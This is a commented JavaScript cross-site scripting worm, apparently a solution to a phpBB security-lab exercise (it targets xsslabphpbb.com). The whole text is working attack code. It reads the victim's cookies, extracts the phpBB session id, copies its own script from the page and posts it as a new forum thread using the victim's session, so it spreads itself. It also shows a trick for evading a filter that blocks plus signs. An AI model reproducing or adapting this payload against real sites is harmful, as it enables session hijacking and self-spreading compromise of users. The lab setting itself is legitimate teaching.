//Place a giant image in the post, so we're not just posting nothing
<img src=http://i.imgur.com/B4kPQ.jpg>

//Define the worm
<script id=sunshineAndRainbows>
	//Grab all the user's cookies
    var cookies=document.cookie.split(';');
	var sid_cookie=null;
    //Search through the array of cookies for the one that contains "phpbb2mysql_sid"
    //Note that we need to use i=i-(-1) here since + symbols aren't allowed
	for(i=0;i<cookies.length;i=i-(-1)){
        //When we find it, slice of the start. The rest of the string will be
        //the cookie we need
		if(cookies[i].match("phpbb2mysql_sid")) sid_cookie=cookies[i].slice(13)
	};
    //Grab the payload from the current web page
	var payload=document.getElementById("sunshineAndRainbows").innerHTML;
	var Ajax=null;

    //Build the HTTP Request to match the contents of a genuine posting request
	Ajax=new XMLHttpRequest();
	Ajax.open("POST","http://www.xsslabphpbb.com/posting.php",true);
	Ajax.setRequestHeader("Host","www.xsslabphpbb.com");
	Ajax.setRequestHeader("Keep-Alive","300");
	Ajax.setRequestHeader("Connection","keep-alive");
	Ajax.setRequestHeader("Cookie",document.cookie);
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

    //Set the content to be a request to create a new thread
	var content="".concat(
        "subject=XSSWorm",//The subject of the new thread
        "&message=%3Cimg src=http://i.imgur.com/B4kPQ.jpg%3E",//The aforementioned giant image
        "%3Cscript id=sunshineAndRainbows%3E",escape(payload),"%3C%2Fscript%3E",//The self-replicating part of the virus
        "&mode=newtopic&f=1&",sid_cookie,"&post=Submit"); //Submit this as a request for a new thread in subforum 1

    //And here we go...
	Ajax.send(content);
</script>